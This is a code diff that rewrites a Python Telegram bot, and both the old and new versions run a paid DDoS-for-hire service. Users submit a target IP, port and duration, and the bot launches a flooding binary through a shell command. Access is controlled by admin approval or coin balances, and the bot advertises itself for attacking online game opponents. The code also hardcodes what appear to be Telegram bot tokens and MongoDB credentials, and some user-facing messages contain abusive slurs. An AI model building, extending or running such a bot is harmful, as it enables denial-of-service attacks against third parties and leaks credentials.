@@ -1,247 +1,274 @@
-import os
-import telebot
-import json
-import requests
-import logging
-import time
-from pymongo import MongoClient
-from datetime import datetime, timedelta
-import certifi
-import random
-from threading import Thread
 import asyncio
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton
+from datetime import datetime, timedelta
+from telegram import Update
+from telegram.ext import Application, CommandHandler, CallbackContext
+from motor.motor_asyncio import AsyncIOMotorClient
 
-loop = asyncio.get_event_loop()
-
-# Bot Configuration: Set with Authority
-TOKEN = '7062229353:AAH6FPInn89wclji6XMwrqO3ATh6JGg6gCI'
-ADMIN_USER_ID = 1079846534
-MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
-USERNAME = "@Vectorbhai"  # Immutable username for maximum security
-
-# Attack Status Variable to Control Single Execution
+bot_start_time = datetime.now()
 attack_in_progress = False
+current_attack = None  # Store details of the current attack
+attack_history = []  # Store attack logs
 
-# Logging for Precision Monitoring
-logging.basicConfig(format='%(asctime)s - ⚔️ %(message)s', level=logging.INFO)
+TELEGRAM_BOT_TOKEN = '7454983271:AAGL9JzjR_62y5YJcdhY60oQO6_GPH5F2mE'
+ADMIN_USER_ID = 7972657976
+MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
+DB_NAME = "sarkar"
+COLLECTION_NAME = "users"
+attack_in_progress = False
+ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
+COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
 
-# MongoDB Connection - Operative Data Storage
-client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['sharp']
-users_collection = db.users
+# MongoDB setup
+mongo_client = AsyncIOMotorClient(MONGO_URI)
+db = mongo_client[DB_NAME]
+users_collection = db[COLLECTION_NAME]
 
-# Bot Initialization
-bot = telebot.TeleBot(TOKEN)
-REQUEST_INTERVAL = 1
+async def get_user(user_id):
+    """Fetch user data from MongoDB."""
+    user = await users_collection.find_one({"user_id": user_id})
+    if not user:
+        return {"user_id": user_id, "coins": 0}
+    return user
 
-blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
-
-# Asyncio Loop for Operations
-async def start_asyncio_thread():
-    asyncio.set_event_loop(loop)
-    await start_asyncio_loop()
-
-# Proxy Update Command with Dark Authority
-def update_proxy():
-    proxy_list = []  # Define proxies here
-    proxy = random.choice(proxy_list) if proxy_list else None
-    if proxy:
-        telebot.apihelper.proxy = {'https': proxy}
-        logging.info("🕴️ Proxy shift complete. Surveillance evaded.")
-
-@bot.message_handler(commands=['update_proxy'])
-def update_proxy_command(message):
-    chat_id = message.chat.id
-    try:
-        update_proxy()
-        bot.send_message(chat_id, f"🔄 Proxy locked in. We’re untouchable. Bot by {USERNAME}")
-    except Exception as e:
-        bot.send_message(chat_id, f"⚠️ Proxy config failed: {e}")
-
-async def start_asyncio_loop():
-    while True:
-        await asyncio.sleep(REQUEST_INTERVAL)
-
-# Attack Initiation - Operative Status Checks and Intensity
-async def run_attack_command_async(target_ip, target_port, duration):
-    global attack_in_progress
-    attack_in_progress = True  # Set the flag to indicate an attack is in progress
-
-    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 900")
-    await process.communicate()
-
-    attack_in_progress = False  # Reset the flag after the attack is complete
-    notify_attack_finished(target_ip, target_port, duration)
-
-# Final Attack Message Upon Completion
-def notify_attack_finished(target_ip, target_port, duration):
-    bot.send_message(
-        ADMIN_USER_ID,
-        f"🔥 *MISSION ACCOMPLISHED!* 🔥\n\n"
-        f"🎯 *TARGET NEUTRALIZED:* `{target_ip}`\n"
-        f"💣 *PORT BREACHED:* `{target_port}`\n"
-        f"⏳ *DURATION:* `{duration} seconds`\n\n"
-        f"💥 *Operation Complete. No Evidence Left Behind. Courtesy of {USERNAME}*",
-        parse_mode='Markdown'
+async def update_user(user_id, coins):
+    """Update user coins in MongoDB."""
+    await users_collection.update_one(
+        {"user_id": user_id},
+        {"$set": {"coins": coins}},
+        upsert=True
     )
 
-@bot.message_handler(commands=['approve', 'disapprove'])
-def approve_or_disapprove_user(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-    cmd_parts = message.text.split()
+async def start(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    message = (
+        "*❄️ WELCOME TO SARKAR VIP DDOS BOT ❄️*\n\n"
+        "*🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥*\n\n"
+        "*✨ Key Features: ✨*\n"
+        "🚀 *𝘼𝙩𝙩𝙖𝙘𝙠 𝙠𝙖𝙧𝙤 𝙖𝙥𝙣𝙚 𝙤𝙥𝙥𝙤𝙣𝙚𝙣𝙩𝙨 𝙥𝙖𝙧 𝘽𝙜𝙢𝙞 𝙈𝙚 /attack*\n"
+        "🏦 *𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙠𝙖 𝙗𝙖𝙡𝙖𝙣𝙘𝙚 𝙖𝙪𝙧 𝙖𝙥𝙥𝙧𝙤𝙫𝙖𝙡 𝙨𝙩𝙖𝙩𝙪𝙨 𝙘𝙝𝙚𝙘𝙠 𝙠𝙖𝙧𝙤 /myinfo*\n"
+        "🤡 *𝘼𝙪𝙧 𝙝𝙖𝙘𝙠𝙚𝙧 𝙗𝙖𝙣𝙣𝙚 𝙠𝙚 𝙨𝙖𝙥𝙣𝙤 𝙠𝙤 𝙠𝙖𝙧𝙡𝙤 𝙥𝙤𝙤𝙧𝙖! 😂*\n\n"
+        "*⚠️ Kaise Use Kare? ⚠️*\n"
+        "*Commands ka use karo aur commands ka pura list dekhne ke liye type karo: /help*\n\n"
+        "*💬 Queries or Issues? 💬*\n"
+        "*Contact Admin: @Sarkar3009*"
+    )
+    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+    
+async def daku(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    args = context.args
 
-    if user_id != ADMIN_USER_ID:
-        bot.send_message(chat_id, f"🚫 *Access Denied. Only {USERNAME} controls this realm.*", parse_mode='Markdown')
+    if chat_id != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=chat_id, text="*🖕 Chal nikal! Tera aukaat nahi hai yeh command chalane ki. Admin se baat kar pehle.*", parse_mode='Markdown')
         return
 
-    if len(cmd_parts) < 2:
-        bot.send_message(chat_id, f"📝 *Format: /approve <user_id> <plan> <days> or /disapprove <user_id>. Reserved by {USERNAME}*", parse_mode='Markdown')
+    if len(args) != 3:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Tere ko simple command bhi nahi aati? Chal, sikh le: /daku <add|rem> <user_id> <coins>*", parse_mode='Markdown')
         return
 
-    action, target_user_id = cmd_parts[0], int(cmd_parts[1])
-    plan, days = (int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0), (int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0)
+    command, target_user_id, coins = args
+    coins = int(coins)
+    target_user_id = int(target_user_id)
 
-    if action == '/approve':
-        limit_reached = (plan == 1 and users_collection.count_documents({"plan": 1}) >= 99) or \
-                        (plan == 2 and users_collection.count_documents({"plan": 2}) >= 499)
-        if limit_reached:
-            bot.send_message(chat_id, f"⚠️ *Plan limit reached. Access denied. Controlled by {USERNAME}*", parse_mode='Markdown')
-            return
+    user = await get_user(target_user_id)
 
-        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days else datetime.now().date().isoformat()
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
-            upsert=True
-        )
-        msg_text = f"*User {target_user_id} granted access – Plan {plan} for {days} days. Approved by {USERNAME}*"
-    else:
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
-            upsert=True
-        )
-        msg_text = f"*User {target_user_id} removed. Clearance by {USERNAME}*"
+    if command == 'add':
+        new_balance = user["coins"] + coins
+        await update_user(target_user_id, new_balance)
+        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ko {coins} coins diye gaye. Balance: {new_balance}.*", parse_mode='Markdown')
+    elif command == 'rem':
+        new_balance = max(0, user["coins"] - coins)
+        await update_user(target_user_id, new_balance)
+        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ke {coins} coins kaat diye. Balance: {new_balance}.*", parse_mode='Markdown')
 
-    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
+from datetime import datetime, timedelta
 
-@bot.message_handler(commands=['Attack'])
-def attack_command(message):
-    global attack_in_progress
-    chat_id = message.chat.id
+# Add these global variables
+attack_in_progress = False
+attack_end_time = None  # Stores the end time of the ongoing attack
+bot_start_time = datetime.now()  # Tracks when the bot started
 
-    # Check if an attack is already in progress
-    if attack_in_progress:
-        bot.send_message(chat_id, f"⚠️ *An attack is already in progress. Please wait until it completes, {USERNAME}.*", parse_mode='Markdown')
-        return
+async def attack(update: Update, context: CallbackContext):
+    global attack_in_progress, attack_end_time, bot_start_time
 
-    user_id = message.from_user.id
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+    args = context.args
 
-    try:
-        # Check user access
-        user_data = users_collection.find_one({"user_id": user_id})
-        if not user_data or user_data['plan'] == 0:
-            bot.send_message(chat_id, f"🚫 Unauthorized. Access limited to {USERNAME}.")
-            return
+    user = await get_user(user_id)
 
-        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
-            bot.send_message(chat_id, f"🟠 Plan 🧡 is full. Reach out to {USERNAME} for upgrades.")
-            return
-
-        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
-            bot.send_message(chat_id, f"💥 Instant++ Plan at capacity. Contact {USERNAME}.")
-            return
-
-        bot.send_message(chat_id, f"📝 Provide target details – IP, Port, Duration (seconds). Controlled by {USERNAME}")
-        bot.register_next_step_handler(message, process_attack_command)
-    except Exception as e:
-        logging.error(f"Attack command error: {e}")
-
-def process_attack_command(message):
-    try:
-        args = message.text.split()
-        if len(args) != 3:
-            bot.send_message(message.chat.id, f"⚠️ *Format incorrect. Use: /Attack <IP> <Port> <Duration>. Maintained by {USERNAME}*", parse_mode='Markdown')
-            return
-
-        target_ip, target_port, duration = args[0], int(args[1]), args[2]
-
-        if target_port in blocked_ports:
-            bot.send_message(message.chat.id, f"🚫 *Port {target_port} restricted. Select a different entry point. Governed by {USERNAME}*", parse_mode='Markdown')
-            return
-
-        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
-        bot.send_message(
-            message.chat.id,
-            f"💀 *⚠️ ATTACK INITIATED!* 💀\n\n"
-            f"💢 *SIGMA STRIKE IN EFFECT!* 💢\n\n"
-            f"🎯 *TARGET SET:* `{target_ip}`\n"
-            f"🔒 *PORT ACCESSED:* `{target_port}`\n"
-            f"⏳ *DURATION LOCKED:* `{duration} seconds`\n\n"
-            f"🔥 *Unleashing force. No turning back. Powered by {USERNAME}* ⚡",
+    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text="*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂*",
             parse_mode='Markdown'
         )
-    except Exception as e:
-        logging.error(f"Error in process_attack_command: {e}")
+        return
 
-def start_asyncio_thread():
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(start_asyncio_loop())
+    if attack_in_progress:
+        remaining_time = (attack_end_time - datetime.now()).total_seconds()
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=f"*⚠️ Arre bhai, ruk ja! Ek aur attack chal raha hai. Attack khatam hone mein {int(remaining_time)} seconds bache hain.*",
+            parse_mode='Markdown'
+        )
+        return
 
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    # Unique, Intense Menu Options
-    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
-    options = [
-        "💀 Initiate Attack 🔥", 
-        "🔍 Status Report", 
-        "📜 Mission Brief", 
-        "📞 Contact HQ"
-    ]
-    buttons = [KeyboardButton(option) for option in options]
-    markup.add(*buttons)
+    if len(args) != 3:
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=(
+                "*❌ Usage galat hai! Command ka sahi format yeh hai:*\n"
+                "*👉 /attack <ip> <port> <duration>*\n"
+                "*📌 Example: /attack 192.168.1.1 26547 240*"
+            ),
+            parse_mode='Markdown'
+        )
+        return
 
-    bot.send_message(
-        message.chat.id,
-        f"👊 *Welcome to Command, Agent. Choose your directive.* Managed by {USERNAME}",
-        reply_markup=markup,
+    ip, port, duration = args
+    port = int(port)
+    duration = int(duration)
+
+    # Check for restricted ports
+    restricted_ports = [17500, 20000, 20001, 20002]
+    if port in restricted_ports or (100 <= port <= 999):
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=(
+                "*❌ YE PORT WRONG HAI SAHI PORT DALO AUR NAHI PATA TOH YE VIDEO DEKHO ❌*\n\n"
+                "*📺 LINK: https://youtu.be/ZuBEu76PE6Y?si=Mdshlvz93CE6lZNO*"
+            ),
+            parse_mode='Markdown'
+        )
+        return
+
+    if duration > ATTACK_TIME_LIMIT:
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=(
+                f"*⛔ Limit cross mat karo! Tum sirf {ATTACK_TIME_LIMIT} seconds tak attack kar sakte ho.*\n"
+                "*Agar zyada duration chahiye toh admin se baat karo! 😎*"
+            ),
+            parse_mode='Markdown'
+        )
+        return
+
+    # Deduct coins
+    new_balance = user["coins"] - COINS_REQUIRED_PER_ATTACK
+    await update_user(user_id, new_balance)
+
+    attack_in_progress = True
+    attack_end_time = datetime.now() + timedelta(seconds=duration)
+    await context.bot.send_message(
+        chat_id=chat_id,
+        text=(
+            "*🚀 [ATTACK INITIATED] 🚀*\n\n"
+            f"*💣 Target IP: {ip}*\n"
+            f"*🔢 Port: {port}*\n"
+            f"*🕒 Duration: {duration} seconds*\n"
+            f"*💰 Coins Deducted: {COINS_REQUIRED_PER_ATTACK}*\n"
+            f"*📉 Remaining Balance: {new_balance}*\n\n"
+            "*🔥 Attack chal raha hai! Chill kar aur enjoy kar! 💥*"
+        ),
         parse_mode='Markdown'
     )
 
-@bot.message_handler(func=lambda message: True)
-def handle_message(message):
-    if message.text == "💀 Initiate Attack 🔥":
-        bot.reply_to(message, f"*Command received. Preparing deployment. Stand by, {USERNAME}*", parse_mode='Markdown')
-        attack_command(message)
-    elif message.text == "🔍 Status Report":
-        user_id = message.from_user.id
-        user_data = users_collection.find_one({"user_id": user_id})
-        if user_data:
-            username = message.from_user.username
-            plan, valid_until = user_data.get('plan', 'N/A'), user_data.get('valid_until', 'N/A')
-            response = (f"*Agent ID: {username}\n"
-                        f"Plan Level: {plan}\n"
-                        f"Authorized Until: {valid_until}\n"
-                        f"Timestamp: {datetime.now().isoformat()}. Verified by {USERNAME}*")
-        else:
-            response = f"*Profile unknown. Contact {USERNAME} for authorization.*"
-        bot.reply_to(message, response, parse_mode='Markdown')
-    elif message.text == "📜 Mission Brief":
-        bot.reply_to(message, f"*For support, type /help or contact {USERNAME} at HQ.*", parse_mode='Markdown')
-    elif message.text == "📞 Contact HQ":
-        bot.reply_to(message, f"*Direct Line to HQ: {USERNAME}*", parse_mode='Markdown')
-    else:
-        bot.reply_to(message, f"❗*Unknown command. Focus, Agent. Managed by {USERNAME}*", parse_mode='Markdown')
+    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
 
-if __name__ == "__main__":
-    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
-    asyncio_thread.start()
-    logging.info("🚀 Bot is operational and mission-ready.")
+async def run_attack(chat_id, ip, port, duration, context):
+    global attack_in_progress, attack_end_time
+    attack_in_progress = True
 
-    while True:
-        try:
-            bot.polling(none_stop=True)
-        except Exception as e:
-            logging.error(f"Polling error: {e}")
+    try:
+        command = f"./soul {ip} {port} {duration} {900}"
+        process = await asyncio.create_subprocess_shell(
+            command,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await process.communicate()
+
+        if stdout:
+            print(f"[stdout]\n{stdout.decode()}")
+        if stderr:
+            print(f"[stderr]\n{stderr.decode()}")
+
+    except Exception as e:
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=f"*⚠️ Error: {str(e)}*\n*Command failed to execute. Contact admin if needed.*",
+            parse_mode='Markdown'
+        )
+
+    finally:
+        attack_in_progress = False
+        attack_end_time = None
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=(
+                "*✅ [ATTACK FINISHED] ✅*\n\n"
+                f"*💣 Target IP: {ip}*\n"
+                f"*🔢 Port: {port}*\n"
+                f"*🕒 Duration: {duration} seconds*\n\n"
+                "*💥 Attack complete! Ab chill kar aur feedback bhej! 🚀*"
+            ),
+            parse_mode='Markdown'
+        )
+    
+async def uptime(update: Update, context: CallbackContext):
+    elapsed_time = (datetime.now() - bot_start_time).total_seconds()
+    minutes, seconds = divmod(int(elapsed_time), 60)
+    await context.bot.send_message(update.effective_chat.id, text=f"*⏰Bot uptime:* {minutes} minutes, {seconds} seconds", parse_mode='Markdown')
+        
+async def myinfo(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+
+    user = await get_user(user_id)
+
+    balance = user["coins"]
+    message = (
+        f"*📝 Tera info check kar le, chutiye hacker:*\n"
+        f"*💰 Coins: {balance}*\n"
+        f"*😏 Status: Approved*\n"
+        f"*Ab aur kya chahiye? Hacker banne ka sapna toh kabhi poora hoga nahi!*"
+    )
+    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+
+async def help(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    message = (
+        "*🛠️ SARKAR VIP DDOS Bot Help Menu 🛠️*\n\n"
+        "🌟 *Yahan hai sab kuch jo tumhe chahiye!* 🌟\n\n"
+        "📜 *Available Commands:* 📜\n\n"
+        "1️⃣ *🔥 /attack <ip> <port> <duration>*\n"
+        "   - *Is command ka use karke tum attack laga sakte ho.*\n"
+        "   - *Example: /attack 192.168.1.1 20876 240*\n"
+        "   - *📝 Note: Duration 240 seconds se zyada nahi ho sakta.*\n\n"
+        "2️⃣ *💳 /myinfo*\n"
+        "   - *Apne account ka status aur coins check karne ke liye.*\n"
+        "   - *Example: Tumhare balance aur approval status ka pura details milega.*\n\n"
+        "3️⃣ *🔧 /uptime*\n"
+        "   - *Bot ka uptime check karo aur dekho bot kitne der se chal raha hai.*\n\n"
+        "4️⃣ *❓ /help*\n"
+        "   - *Ab ye toh tum already use kar rahe ho! Yeh command bot ke saare features explain karta hai.*\n\n"
+        "🚨 *𝐈𝐦𝐩𝐨𝐫𝐭𝐚𝐧𝐭 𝐓𝐢𝐩𝐬:* 🚨\n"
+        "- *BOT REPLY NAA DE ISKA MATLAB KOI AUR BNDA ATTACK LAGYA HAI SO WAIT.*\n"
+        "- *Agar koi dikkat aaye toh admin ko contact karo: @Sarkar3009*\n\n"
+        "💥 *Ab jao aur hacker banne ka natak shuru karo!* 💥"
+    )
+    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+    
+def main():
+    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("daku", daku))
+    application.add_handler(CommandHandler("attack", attack))
+    application.add_handler(CommandHandler("myinfo", myinfo))
+    application.add_handler(CommandHandler("help", help))
+    application.add_handler(CommandHandler("uptime", uptime))
+    application.run_polling()
+
+if __name__ == '__main__':
+    main()
